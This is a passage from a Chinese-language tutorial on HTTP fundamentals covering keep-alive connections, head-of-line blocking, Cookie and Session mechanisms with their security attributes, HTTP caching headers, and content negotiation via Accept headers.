<li><p>如果任何一方希望在本次通信后<strong>关闭连接</strong>，则需要明确声明：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
</li>
<li><p>当客户端或服务器在报文中包含了 <code>Connection: close</code>，就意味着本次响应发送完毕后，TCP 连接将被关闭。这通常用于客户端确定不再有请求，或服务器处于高负载希望释放连接时。</p>
</li>
</ul>
</li>
</ul>
<p><strong>总结</strong>：</p>
<table>
<thead>
<tr>
<th>HTTP 版本</th>
<th>默认模式</th>
<th>如何开启长连接</th>
<th>如何关闭连接</th>
</tr>
</thead>
<tbody><tr>
<td><strong>HTTP&#x2F;1.0</strong></td>
<td>短连接</td>
<td><code>Connection: keep-alive</code></td>
<td>(默认行为)</td>
</tr>
<tr>
<td><strong>HTTP&#x2F;1.1</strong></td>
<td>长连接</td>
<td>(默认行为)</td>
<td><code>Connection: close</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="1-3-队头阻塞问题-Head-of-Line-Blocking-HOL-Blocking"><a href="#1-3-队头阻塞问题-Head-of-Line-Blocking-HOL-Blocking" class="headerlink" title="1.3 队头阻塞问题 (Head-of-Line Blocking, HOL Blocking)"></a>1.3 队头阻塞问题 (Head-of-Line Blocking, HOL Blocking)</h3><p>长连接虽然极大地提升了性能，但也引入了一个新的、非常棘手的问题——<strong>队头阻塞</strong>。这是 HTTP&#x2F;1.1 时代最主要的性能瓶颈。</p>
<ul>
<li><strong>核心定义</strong>:<br>在一条长连接中，HTTP 请求和响应是<strong>严格的“先进先出” (FIFO) 管道模型</strong>。客户端发送请求 1，必须等待响应 1 完全返回后，才能发送请求 2。此时，队头阻塞发生在<strong>请求端</strong>，整个连接的效率被“一问一答”的模式严重限制。</li>
</ul>
<p>为了解决这个顽固的问题，人们进行了不同的尝试，但结果却大相径庭。</p>
<p><strong>1. 理论上的解决方案：管道化 (Pipelining) —— 一个失败的尝试</strong></p>
<p>HTTP&#x2F;1.1 规范中提出了一种看似聪明的技术——“管道化”。</p>
<ul>
<li><strong>设想</strong>：允许客户端在不等待响应的情况下，连续发送多个请求（比如请求1, 2, 3一口气全发出去），以提高连接利用率。</li>
<li><strong>致命缺陷</strong>：规范同时要求，服务器<strong>必须严格按照接收请求的顺序（1, 2, 3）来返回响应</strong>。这导致队头阻塞问题并未解决，只是从“请求发送端”转移到了“响应返回端”。一个处理缓慢的响应1，依然会阻塞住已经处理完成的响应2和响应3。</li>
<li><strong>最终结局</strong>：由于这个致命缺陷，加上网络中大量代理服务器对其兼容性极差，导致实现复杂且极易出错。因此，<strong>管道化技术在实践中基本被所有主流浏览器默认禁用或彻底放弃</strong>。它成了一个存在于纸面上的理论，而非实用的解决方案。</li>
</ul>
<p><strong>2. 现实中的权宜之计：并发TCP连接 (Concurrent Connections)</strong></p>
<p>既然“管道化”这条路走不通，浏览器厂商只能采取一个更简单粗暴、但行之有效的办法：<strong>多开几条路</strong>。</p>
<ul>
<li><strong>做法</strong>：浏览器被允许对同一个域名<strong>同时建立多条并行的TCP长连接</strong>（通常是6-8条）。当有多个资源需要请求时，浏览器会将它们分配到这些不同的连接上去。</li>
<li><strong>效果</strong>：这就像把原来的“单行道”拓宽成了“6车道高速公路”。一个连接（车道）上的慢请求（慢车），不会再阻塞其他连接（车道）上的快请求。这极大地缓解了队头阻塞问题，是 <strong>HTTP&#x2F;1.1 时代浏览器提升页面加载速度最主要的实用手段</strong>。</li>
<li><strong>局限性</strong>：这并非完美的解决方案。建立和维护多条TCP连接本身会消耗更多客户端和服务器资源，且连接数终究有限，当资源数量远超连接数时，局部排队依然会发生。</li>
</ul>
<p><strong>队头阻塞的最终解决：HTTP&#x2F;2</strong></p>
<p>这个问题的根本解决，要等到 <strong>HTTP&#x2F;2</strong> 的出现。HTTP&#x2F;2 引入了<strong>多路复用 (Multiplexing)</strong> 技术，允许在<strong>一条TCP连接</strong>上真正地、并行地传输多个请求和响应，彻底废除了“并发连接”这个权宜之计，从根源上解决了 HTTP&#x2F;1.1 的队头阻塞问题。我们将在后续章节详细讨论。</p>
<hr>
<h2 id="2-状态管理：Cookie-与-Session"><a href="#2-状态管理：Cookie-与-Session" class="headerlink" title="2. 状态管理：Cookie 与 Session"></a>2. 状态管理：Cookie 与 Session</h2><h3 id="2-1-为什么需要状态管理？-弥补-HTTP-无状态特性"><a href="#2-1-为什么需要状态管理？-弥补-HTTP-无状态特性" class="headerlink" title="2.1 为什么需要状态管理？(弥补 HTTP 无状态特性)"></a>2.1 为什么需要状态管理？(弥补 HTTP 无状态特性)</h3><p>我们在第一章讲过，HTTP 的一个核心特点是<strong>无状态 (Stateless)</strong>。这意味着服务器不会记录任何关于客户端请求的历史信息。每一次请求对于服务器来说都是一个全新的、独立的事件。</p>
<ul>
<li><strong>无状态的优点</strong>: 简化服务器设计，易于实现负载均衡和横向扩展。</li>
<li><strong>无状态的挑战</strong>: 现实世界的 Web 应用几乎都需要“状态”。比如：<ul>
<li><strong>用户登录</strong>: 用户登录后，在网站的不同页面间跳转，服务器必须知道该用户仍然处于登录状态。</li>
<li><strong>购物车</strong>: 用户将商品加入购物车，切换到其他页面，再返回时，购物车中的商品必须还在。</li>
<li><strong>个性化推荐</strong>: 网站需要记住用户的偏好，为其推荐相关内容。</li>
</ul>
</li>
</ul>
<p>为了在无状态的 HTTP 协议之上构建有状态的应用，<strong>Cookie 和 Session</strong> 机制应运而生。它们就像是服务器发给客户端的“通行证”或“会员卡”，让服务器能够在一次次独立的请求中识别出同一个用户。</p>
<hr>
<h3 id="2-2-Cookie：工作原理"><a href="#2-2-Cookie：工作原理" class="headerlink" title="2.2 Cookie：工作原理"></a>2.2 Cookie：工作原理</h3><p>Cookie 是一种由服务器发送到客户端（浏览器），并由客户端保存在本地的一小段文本数据。之后，客户端每次向该服务器发送请求时，都会自动带上这段数据。</p>
<p><strong>工作流程 (四步)</strong>：</p>
<ol>
<li><p><strong>首次请求</strong>: 客户端（浏览器）向服务器发起请求。此时，请求中不包含任何 Cookie 信息。</p>
</li>
<li><p><strong>服务器响应与 <code>Set-Cookie</code></strong>: 服务器处理完请求后，在响应报文的头部中加入一个 <code>Set-Cookie</code> 字段。这个字段包含了要设置的 Cookie 信息（一个键值对和一些属性）。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>user_id=12345</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端存储 Cookie</strong>: 浏览器收到这个响应后，会解析 <code>Set-Cookie</code> 头部，并将 <code>user_id=12345</code> 这条信息与该服务器的域名（例如 <code>example.com</code>）关联起来，存储在本地。</p>
</li>
<li><p><strong>后续请求与 <code>Cookie</code></strong>: 当用户再次访问 <code>example.com</code> 上的任何页面时，浏览器会自动在请求报文的头部中加入一个 <code>Cookie</code> 字段，将之前存储的信息发送给服务器。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/profile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user_id=12345</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
</ol>
<p>通过这个流程，服务器就能在后续的请求中通过读取 <code>Cookie</code> 头部的 <code>user_id</code>，识别出这是 ID 为 12345 的用户，从而为其提供个性化的服务（如显示“欢迎回来！”）。</p>
<hr>
<h3 id="2-3-Cookie-的属性"><a href="#2-3-Cookie-的属性" class="headerlink" title="2.3 Cookie 的属性"></a>2.3 Cookie 的属性</h3><p><code>Set-Cookie</code> 头部不仅可以设置键值对，还可以附加多个属性来控制 Cookie 的行为。这些属性至关重要，直接影响到 Cookie 的生命周期、作用域和安全性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;; Max-Age=&lt;seconds&gt;; Domain=&lt;domain&gt;; Path=&lt;path&gt;; Secure; HttpOnly; SameSite=&lt;Strict|Lax|None&gt;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">示例值</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>Expires</code></strong></td>
<td align="left"><code>Wed, 21 Oct 2025 07:28:00 GMT</code></td>
<td align="left">设置 Cookie 的<strong>绝对过期时间</strong>。到期后，浏览器会自动删除该 Cookie。</td>
</tr>
<tr>
<td align="left"><strong><code>Max-Age</code></strong></td>
<td align="left"><code>3600</code></td>
<td align="left">设置 Cookie 的<strong>相对存活时间</strong>（单位：秒）。<code>Max-Age</code> 的优先级高于 <code>Expires</code>。如果设为 0 或负数，Cookie 会立即失效。</td>
</tr>
<tr>
<td align="left"><strong><code>Domain</code></strong></td>
<td align="left"><code>.example.com</code></td>
<td align="left">指定 Cookie 所属的域名。浏览器在向该域名及其子域名（如 <code>api.example.com</code>）发送请求时都会带上此 Cookie。</td>
</tr>
<tr>
<td align="left"><strong><code>Path</code></strong></td>
<td align="left"><code>/</code></td>
<td align="left">指定 Cookie 生效的路径。只有当请求的路径是该路径或其子路径时，才会发送此 Cookie。<code>Path=/</code> 表示对整个域名都有效。</td>
</tr>
<tr>
<td align="left"><strong><code>Secure</code></strong></td>
<td align="left">(无值)</td>
<td align="left"><strong>安全标志</strong>。如果设置了此属性，浏览器只会在 HTTPS 连接中发送该 Cookie，在不安全的 HTTP 连接中则不会发送。</td>
</tr>
<tr>
<td align="left"><strong><code>HttpOnly</code></strong></td>
<td align="left">(无值)</td>
<td align="left"><strong>HTTP-Only 标志</strong>。如果设置了此属性，该 Cookie <strong>不能被客户端的 JavaScript 脚本访问</strong>（通过 <code>document.cookie</code>）。这是防止 XSS 攻击窃取 Cookie 的一道重要防线。</td>
</tr>
<tr>
<td align="left"><strong><code>SameSite</code></strong></td>
<td align="left"><code>Strict</code>, <code>Lax</code>, <code>None</code></td>
<td align="left">控制 Cookie 在<strong>跨站请求</strong>中的发送策略。这是防止 CSRF 攻击的关键机制。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>Strict</code></td>
<td align="left">完全禁止第三方 Cookie，只有在当前网站内部跳转时才会发送 Cookie。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>Lax</code> (现代浏览器默认值)</td>
<td align="left">允许在一些安全的顶级导航（如点击链接跳转）中发送 Cookie，但在表单提交、图片加载等场景下会限制。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>None</code></td>
<td align="left">允许在任何跨站请求中发送 Cookie。<strong>使用 <code>SameSite=None</code> 时必须同时设置 <code>Secure</code> 属性</strong>。</td>
</tr>
</tbody></table>
<p><strong>会话 Cookie (Session Cookie)</strong> vs <strong>持久性 Cookie (Persistent Cookie)</strong>:</p>
<ul>
<li>如果一个 Cookie <strong>没有</strong>设置 <code>Expires</code> 或 <code>Max-Age</code> 属性，它就是一个<strong>会话 Cookie</strong>。它存储在内存中，当浏览器关闭时就会被删除。</li>
<li>如果设置了 <code>Expires</code> 或 <code>Max-Age</code>，它就是一个<strong>持久性 Cookie</strong>，会被存储在硬盘上，直到过期或被手动删除。</li>
</ul>
<hr>
<h3 id="2-4-Session：基于-Cookie-的服务端状态管理机制"><a href="#2-4-Session：基于-Cookie-的服务端状态管理机制" class="headerlink" title="2.4 Session：基于 Cookie 的服务端状态管理机制"></a>2.4 Session：基于 Cookie 的服务端状态管理机制</h3><p>虽然 Cookie 可以实现状态管理，但它有几个明显的缺点：</p>
<ul>
<li><strong>安全性差</strong>: Cookie 的内容直接存储在客户端，敏感信息（如用户权限、密码等）直接存在 Cookie 中容易被窃取或篡改。</li>
<li><strong>大小受限</strong>: 浏览器对单个 Cookie 的大小（通常 4KB）和每个域名下的 Cookie 数量都有限制。</li>
<li><strong>网络开销</strong>: 每次请求都需要携带 Cookie，如果 Cookie 内容过多，会增加网络传输的负担。</li>
</ul>
<p>为了解决这些问题，<strong>Session</strong> 机制应运而生。</p>
<ul>
<li><strong>核心思想</strong>: <strong>将核心的、敏感的用户状态数据存储在服务器端，而只在客户端的 Cookie 中存储一个唯一的、无意义的标识符（Session ID）。</strong></li>
</ul>
<p><strong>工作流程</strong>:</p>
<ol>
<li><p><strong>用户首次访问&#x2F;登录</strong>:</p>
<ul>
<li>客户端向服务器发送请求。</li>
<li>服务器验证用户信息（如用户名密码）通过后，在<strong>服务器端</strong>创建一个 Session 对象（可以是一个内存中的哈希表、Redis 缓存等），用来存储该用户的具体信息（如用户ID、姓名、权限等）。</li>
<li>服务器为这个 Session 对象生成一个<strong>唯一的 Session ID</strong>（一个随机字符串）。</li>
<li>服务器通过 <code>Set-Cookie</code> 响应头，将这个 <strong>Session ID</strong> 发送给客户端。</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session_id=aBcDeFg12345; HttpOnly</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端存储 Session ID</strong>: 浏览器收到响应后，将 <code>session_id=aBcDeFg12345</code> 这条 Cookie 存储起来。注意，这个 Cookie 里只有无意义的 ID，没有任何敏感数据。</p>
</li>
<li><p><strong>后续请求</strong>:</p>
<ul>
<li>客户端再次向服务器发起请求时，会自动带上这条包含 Session ID 的 Cookie。</li>
<li>服务器收到请求后，从 Cookie 中读取 Session ID (<code>aBcDeFg12345</code>)。</li>
<li>服务器用这个 Session ID 在自己的 Session 存储中进行查找，找到对应的 Session 对象。</li>
<li>从 Session 对象中读取用户的状态信息（如“已登录”、“管理员权限”），然后进行相应的处理。</li>
</ul>
</li>
</ol>
<p><strong>Cookie 与 Session 的关系与区别</strong></p>
<ul>
<li><strong>关系</strong>: Session 通常是<strong>依赖于 Cookie</strong> 来实现的。Cookie 是承载 Session ID 的载体。</li>
<li><strong>区别</strong>:<ul>
<li><strong>存储位置</strong>: Cookie 数据存在<strong>客户端</strong>；Session 数据存在<strong>服务器端</strong>。</li>
<li><strong>安全性</strong>: Session 比 Cookie <strong>更安全</strong>，因为敏感数据不离开服务器。</li>
<li><strong>数据大小</strong>: Cookie 有大小限制；Session 理论上可以存储任意大小的数据（取决于服务器资源）。</li>
<li><strong>服务器压力</strong>: Session 会增加服务器的存储和计算压力。每个在线用户都需要一个 Session 对象。</li>
</ul>
</li>
</ul>
<p><strong>总结</strong>: Cookie 和 Session 是协同工作的，它们共同解决了 HTTP 无状态的问题，使得构建复杂的、有状态的 Web 应用成为可能。在现代 Web 开发中，通常将 Session ID 存储在设置为 <code>HttpOnly</code> 的 Cookie 中，以兼顾功能和安全性。</p>
<hr>
<h2 id="3-缓存控制"><a href="#3-缓存控制" class="headerlink" title="3. 缓存控制"></a>3. 缓存控制</h2><h3 id="3-1-缓存的价值"><a href="#3-1-缓存的价值" class="headerlink" title="3.1 缓存的价值"></a>3.1 缓存的价值</h3><p>HTTP 缓存是一种将已经获取过的资源副本存储起来，以便在下次请求相同资源时可以直接使用，而无需再次向源服务器请求的技术。</p>
<ul>
<li><strong>缓存的位置</strong>: 缓存可以存在于请求链路的多个环节，最常见的是<strong>浏览器缓存</strong>，此外还有代理服务器缓存、CDN 边缘节点缓存等。</li>
<li><strong>核心价值</strong>:<ol>
<li><strong>提升性能，加快加载速度</strong>: 直接从本地磁盘或内存中读取资源，速度远快于通过网络请求。这使得页面加载更快，用户体验更好。</li>
<li><strong>减少网络带宽消耗</strong>: 对于未改变的资源，无需重复下载，节省了用户的流量，也减轻了服务器的带宽压力。</li>
<li><strong>降低服务器负载</strong>: 减少了服务器需要处理的请求数量，让服务器可以更专注于处理动态请求。</li>
</ol>
</li>
</ul>
<p>HTTP 缓存主要分为两大类：<strong>强制缓存</strong>和<strong>协商缓存</strong>。浏览器在请求资源时，会按照以下流程来判断：</p>
<ol>
<li>先检查本地是否有该资源的<strong>强制缓存</strong>，并且缓存是否有效（未过期）。<ul>
<li>如果<strong>有效</strong>，则直接使用缓存，不向服务器发送任何请求。这个过程非常快，HTTP 状态码是 <code>200 OK (from memory cache / from disk cache)</code>。</li>
</ul>
</li>
<li>如果强制缓存<strong>无效</strong>（不存在或已过期），则进入<strong>协商缓存</strong>阶段。<ul>
<li>浏览器向服务器发送一个包含特定验证头部的请求。</li>
<li>服务器根据这些头部判断资源是否有更新。<ul>
<li>如果<strong>无更新</strong>，服务器返回 <code>304 Not Modified</code> 响应，不包含响应体。浏览器使用本地的旧缓存。</li>
<li>如果有<strong>更新</strong>，服务器返回 <code>200 OK</code> 响应，并附带全新的资源内容。浏览器使用新资源并更新本地缓存。</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="3-2-强制缓存"><a href="#3-2-强制缓存" class="headerlink" title="3.2 强制缓存"></a>3.2 强制缓存</h3><p>强制缓存也叫强缓存，是当缓存有效时，浏览器<strong>无需向服务器发送任何请求</strong>，直接使用本地副本。控制强制缓存的主要是两个响应头：<code>Expires</code> 和 <code>Cache-Control</code>。</p>
<ul>
<li><strong><code>Expires</code> (HTTP&#x2F;1.0)</strong><ul>
<li><strong>作用</strong>: 指定一个<strong>绝对的过期时间</strong>。</li>
<li><strong>格式</strong>: <code>Expires: Wed, 21 Oct 2025 07:28:00 GMT</code></li>
<li><strong>工作方式</strong>: 浏览器会将这个过期时间与客户端的当前时间进行比较。如果当前时间还没到过期时间，就命中强制缓存。</li>
<li><strong>缺点</strong>:<ul>
<li><strong>依赖客户端时间</strong>: 如果用户本地的系统时间不准确，可能会导致缓存提前失效或永远不失效。</li>
<li>格式复杂，可读性差。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>Cache-Control: max-age=&lt;seconds&gt;</code> (HTTP&#x2F;1.1)</strong><ul>
<li><strong>作用</strong>: 指定一个<strong>相对的存活时间</strong>，单位是秒。</li>
<li><strong>格式</strong>: <code>Cache-Control: max-age=3600</code> (表示资源在被获取后的 3600 秒内有效)。</li>
<li><strong>工作方式</strong>: 浏览器记录下资源被获取的时间点，之后每次判断时，只需检查 <code>(当前时间 - 获取时间)</code> 是否超过了 <code>max-age</code>。</li>
<li><strong>优点</strong>: 不依赖客户端时间，更加精确可靠。</li>
<li><strong>优先级</strong>: <strong>如果 <code>Cache-Control: max-age</code> 和 <code>Expires</code> 同时存在，<code>Cache-Control</code> 的优先级更高。</strong></li>
</ul>
</li>
<li><strong><code>Cache-Control</code> 的其他常用指令</strong>:<ul>
<li><code>public</code>: 表明响应可以被任何缓存（包括浏览器、代理服务器）缓存。</li>
<li><code>private</code>: 表明响应只能被单个用户的浏览器缓存，不能被共享缓存（如代理服务器）缓存。</li>
<li><code>no-cache</code>: <strong>不是不缓存！</strong> 它的意思是，你可以缓存这个资源，但每次使用前<strong>必须</strong>去服务器进行<strong>协商缓存</strong>验证，不能直接使用强制缓存。</li>
<li><code>no-store</code>: <strong>这才是真正的不缓存！</strong> 指示浏览器和代理服务器完全不要缓存这个响应的任何内容。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-3-协商缓存"><a href="#3-3-协商缓存" class="headerlink" title="3.3 协商缓存"></a>3.3 协商缓存</h3><p>当强制缓存失效后（或被设置为 <code>no-cache</code>），浏览器会向服务器发起一个“条件请求”，由服务器来判断资源是否真的发生了变化。这个过程就是协商缓存。它通过两组成对的请求&#x2F;响应头来实现。</p>
<p><strong>第一组：<code>Last-Modified</code> &amp; <code>If-Modified-Since</code></strong></p>
<ol>
<li><p><strong>首次响应</strong>: 服务器在响应头中包含 <code>Last-Modified</code> 字段，表示资源在服务器上的最后修改时间。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Tue, 15 Nov 2022 12:45:26 GMT</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>后续请求</strong>: 浏览器在下次请求该资源时，会在请求头中带上 <code>If-Modified-Since</code> 字段，其值就是上次服务器返回的 <code>Last-Modified</code> 的值。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Tue, 15 Nov 2022 12:45:26 GMT</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>服务器判断</strong>:</p>
<ul>
<li>服务器比较 <code>If-Modified-Since</code> 的时间和资源的当前最后修改时间。</li>
<li>如果时间<strong>一致</strong>，说明资源未变，返回 <code>304 Not Modified</code>。</li>
<li>如果时间<strong>不一致</strong>，说明资源已更新，返回 <code>200 OK</code>，并附带新的资源和新的 <code>Last-Modified</code> 时间。</li>
</ul>
</li>
</ol>
<ul>
<li><strong>缺点</strong>:<ul>
<li><strong>时间精度问题</strong>: <code>Last-Modified</code> 只能精确到秒。如果一个文件在 1 秒内被多次修改，服务器无法感知到变化。</li>
<li><strong>内容未变但时间变了</strong>: 有时文件内容没变，但元数据（如被重新保存）变了，<code>Last-Modified</code> 也会更新，导致不必要的传输。</li>
</ul>
</li>
</ul>
<p><strong>第二组：<code>ETag</code> &amp; <code>If-None-Match</code> (更优的方案)</strong></p>
<p>为了解决 <code>Last-Modified</code> 的问题，HTTP&#x2F;1.1 引入了 ETag。</p>
<ol>
<li><p><strong>首次响应</strong>: 服务器在响应头中包含 <code>ETag</code> 字段。ETag 是资源的一个唯一标识符，像一个“指纹”或“版本号”。它可以是文件内容的哈希值、版本 ID 等。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;33a64df551425fcc55e4d42a148795d9f25f89d4&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>后续请求</strong>: 浏览器在下次请求时，会在请求头中带上 <code>If-None-Match</code> 字段，其值就是上次服务器返回的 <code>ETag</code> 的值。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;33a64df551425fcc55e4d42a148795d9f25f89d4&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>服务器判断</strong>:</p>
<ul>
<li>服务器比较 <code>If-None-Match</code> 的值和资源当前的 ETag 值。</li>
<li>如果值<strong>一致</strong>，说明资源未变，返回 <code>304 Not Modified</code>。</li>
<li>如果值<strong>不一致</strong>，说明资源已更新，返回 <code>200 OK</code>，并附带新的资源和新的 <code>ETag</code> 值。</li>
</ul>
</li>
</ol>
<ul>
<li><strong>优点</strong>:<ul>
<li><strong>精度高</strong>: 只要资源内容有任何变化，ETag 就会改变。</li>
<li><strong>解决了 <code>Last-Modified</code> 的所有问题</strong>。</li>
</ul>
</li>
<li><strong>优先级</strong>: <strong>如果 <code>ETag</code> 和 <code>Last-Modified</code> 同时存在，<code>ETag</code> 的优先级更高。</strong></li>
</ul>
<hr>
<h3 id="3-4-用户操作对缓存的影响"><a href="#3-4-用户操作对缓存的影响" class="headerlink" title="3.4 用户操作对缓存的影响"></a>3.4 用户操作对缓存的影响</h3><p>用户的不同刷新操作会向浏览器发送不同的缓存策略指令，从而影响缓存的行为。</p>
<ol>
<li><strong>地址栏回车 &#x2F; 点击链接 &#x2F; 前进后退按钮</strong><ul>
<li><strong>行为</strong>: 这是最常规的页面访问方式。</li>
<li><strong>缓存策略</strong>: 浏览器会严格按照上述流程，<strong>先检查强制缓存，再检查协商缓存</strong>。这是缓存机制最有效的场景。</li>
</ul>
</li>
<li><strong>F5 刷新 &#x2F; 点击刷新按钮</strong><ul>
<li><strong>行为</strong>: 用户希望看到页面的最新状态。</li>
<li><strong>缓存策略</strong>: 浏览器会<strong>跳过强制缓存</strong>，直接发起协商缓存。</li>
<li>具体表现是，请求头中会加入 <code>Cache-Control: max-age=0</code> 或 <code>Cache-Control: no-cache</code>。这意味着浏览器会向服务器发送 <code>If-Modified-Since</code> 或 <code>If-None-Match</code> 来验证资源是否过期。如果资源未变，服务器返回 <code>304</code>。</li>
</ul>
</li>
<li><strong>Ctrl + F5 强制刷新 (或 Cmd+Shift+R)</strong><ul>
<li><strong>行为</strong>: 用户希望彻底地、无条件地从服务器获取最新的资源，忽略所有本地缓存。</li>
<li><strong>缓存策略</strong>: 浏览器会<strong>同时跳过强制缓存和协商缓存</strong>。</li>
<li>具体表现是，请求头中<strong>不会包含</strong> <code>If-Modified-Since</code> 和 <code>If-None-Match</code> 字段。服务器无法进行协商，只能无条件地返回 <code>200 OK</code> 和完整的资源内容。</li>
</ul>
</li>
</ol>
<p><strong>总结表</strong></p>
<table>
<thead>
<tr>
<th>用户操作</th>
<th>强制缓存检查</th>
<th>协商缓存检查</th>
<th>典型请求头</th>
</tr>
</thead>
<tbody><tr>
<td><strong>地址栏回车&#x2F;链接跳转</strong></td>
<td><strong>是</strong></td>
<td><strong>是</strong></td>
<td>(无特殊头部)</td>
</tr>
<tr>
<td><strong>F5 刷新</strong></td>
<td><strong>否</strong></td>
<td><strong>是</strong></td>
<td><code>Cache-Control: max-age=0</code>, <code>If-None-Match</code>, …</td>
</tr>
<tr>
<td><strong>Ctrl+F5 强制刷新</strong></td>
<td><strong>否</strong></td>
<td><strong>否</strong></td>
<td>(无 <code>If-None-Match</code> 等协商缓存头部)</td>
</tr>
</tbody></table>
<hr>
<h2 id="4-内容协商"><a href="#4-内容协商" class="headerlink" title="4. 内容协商"></a>4. 内容协商</h2><p>内容协商是指客户端和服务器之间就如何为给定资源选择最佳表示形式（representation）而进行“协商”的过程。同一个资源可以有多种不同的表示，例如：</p>
<ul>
<li><strong>不同语言的版本</strong>: 同一篇文章可以有英文版、中文版。</li>
<li><strong>不同内容格式的版本</strong>: 同一份数据可以提供 HTML 格式（用于浏览器展示）和 JSON 格式（用于 API 调用）。</li>
<li><strong>不同压缩格式的版本</strong>: 同一个文件可以用 <code>gzip</code> 压缩，也可以用 <code>br</code> 压缩。</li>
</ul>
<p>内容协商机制使得服务器可以根据客户端声明的能力和偏好，从这些版本中选择最合适的一个返回。</p>
<hr>
<h3 id="4-1-客户端通过-Accept-系列头部声明期望格式"><a href="#4-1-客户端通过-Accept-系列头部声明期望格式" class="headerlink" title="4.1 客户端通过 Accept-\* 系列头部声明期望格式"></a>4.1 客户端通过 <code>Accept-\*</code> 系列头部声明期望格式</h3><p>协商的发起方是客户端。客户端通过在 HTTP 请求中加入一系列 <code>Accept-*</code> 头部，来告知服务器它能理解和偏好哪些类型的资源表示。</p>
<p>这些头部通常使用<strong>质量值 (quality value)</strong>，即 <code>q</code> 因子，来表示偏好程度。<code>q</code> 的取值范围是 0 到 1（0 表示不接受，1 表示最偏好），权重越高，代表客户端越希望得到该格式。如果不指定 <code>q</code> 值，默认为 1.0。</p>
<p><strong>常用 <code>Accept-\*</code> 头部详解</strong></p>
<table>
<thead>
<tr>
<th>头部 (Header)</th>
<th>作用</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>Accept</code></strong></td>
<td>声明客户端可以理解的 <strong>MIME 类型</strong>。</td>
<td><code>text/html, application/json;q=0.9, */*;q=0.8</code></td>
</tr>
<tr>
<td><strong><code>Accept-Language</code></strong></td>
<td>声明客户端偏好的<strong>自然语言</strong>。</td>
<td><code>fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5</code></td>
</tr>
<tr>
<td><strong><code>Accept-Encoding</code></strong></td>
<td>声明客户端支持的<strong>内容压缩编码</strong>算法。</td>
<td><code>gzip, deflate, br</code></td>
</tr>
</tbody></table>
<p><strong>1. <code>Accept</code>: MIME 类型协商</strong></p>
<ul>
<li><strong>作用</strong>: 告诉服务器客户端能够处理哪些媒体类型（也称 MIME 类型）。</li>
<li><strong>示例分析</strong>: <code>Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, */*;q=0.8</code><ul>
<li><code>text/html</code>, <code>application/xhtml+xml</code>, <code>image/webp</code>: 客户端最希望接收这些类型（<code>q</code> 默认为 1.0）。</li>
<li><code>application/xml</code>: 也能接受，但偏好度稍低（<code>q=0.9</code>）。</li>
<li><code>*/*</code>: <code>*</code> 是通配符，<code>*/*</code> 表示能接受任何类型，但这是最后的选择，偏好度最低（<code>q=0.8</code>）。</li>
</ul>
</li>
<li><strong>应用场景</strong>:<ul>
<li>浏览器访问网页时，会优先请求 <code>text/html</code>。</li>
<li>一个 AJAX 请求可能优先请求 <code>application/json</code>。</li>
</ul>
</li>
</ul>
<p><strong>2. <code>Accept-Language</code>: 语言协商</strong></p>
<ul>
<li><strong>作用</strong>: 告诉服务器客户端偏好的语言。</li>
<li><strong>示例分析</strong>: <code>Accept-Language: zh-CN, zh;q=0.9, en-US;q=0.8, en;q=0.7</code><ul>
<li><code>zh-CN</code>: 客户端最偏好中国大陆的简体中文。</li>
<li><code>zh;q=0.9</code>: 其次是任何种类的中文。</li>
<li><code>en-US;q=0.8</code>: 再次是美式英语。</li>
<li><code>en;q=0.7</code>: 最后是任何种类的英语。</li>
